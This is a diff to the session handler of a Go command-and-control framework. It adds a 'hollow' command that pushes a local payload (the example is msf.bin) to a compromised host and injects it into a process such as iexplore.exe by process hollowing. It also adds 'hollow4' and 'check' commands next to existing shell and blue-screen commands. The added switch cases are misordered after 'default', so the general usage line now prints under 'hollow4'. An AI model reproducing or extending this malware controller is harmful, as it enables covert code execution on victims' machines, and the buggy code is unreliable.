@@ -144,6 +144,8 @@ func openSession(id int, sl *SessionList) {
 		loadMatch := loadRegex.FindString(command)
 		cdRegex := regexp.MustCompile(`cd .+`)
 		cdMatch := cdRegex.FindString(command)
+		hollowRegex := regexp.MustCompile(`hollow .+ .+`)
+		hollowMatch := hollowRegex.FindString(command)
 		if cdMatch != "" {
 			dir2go := strings.Split(command, " ")[1]
 			cd(&current.Conn, dir2go)
@@ -155,6 +157,15 @@ func openSession(id int, sl *SessionList) {
 		if loadMatch != "" {
 			binFile := strings.Split(command, " ")[1]
 			load(&current.Conn, binFile)
+		}
+		if hollowMatch != "" {
+			filePathLocal := strings.Split(command, " ")[1]
+			//filePathTarget := strings.Split(command, " ")[2]
+			filePathTarget := strings.Split(command, "\"")[1]
+			//filePathTarget = "\"" + filePathTarget + "\"" //Not the sexiest fix but will do for now
+			fmt.Println(filePathLocal)
+			fmt.Println(filePathTarget)
+			hollow2(&current.Conn, filePathLocal, filePathTarget) //hollow /home/hummus/Git/Dev/Go/Demolitron_C2/Bushido/msf.bin "C:\\Program Files\\Internet Explorer\\iexplore.exe"
 		}
 		switch command { //All of the func below will be found under bushido.go
 		case "shell":
@@ -185,8 +196,15 @@ func openSession(id int, sl *SessionList) {
 			ls(&current.Conn)
 		case "pwd":
 			pwd(&current.Conn)
+		case "hollow":
+			fmt.Println("Usage: hollow <pathToExeLocal> <\"path2ExeRemote\">")
 		default:
+		case "hollow4":
+			hollow4(&current.Conn)
 			fmt.Println("\nUsage: shell, hostinfo, load, bsod, cd, ls, pwd, bg\n")
+		case "check":
+			check(&current.Conn)
 		}
+
 	}
 }
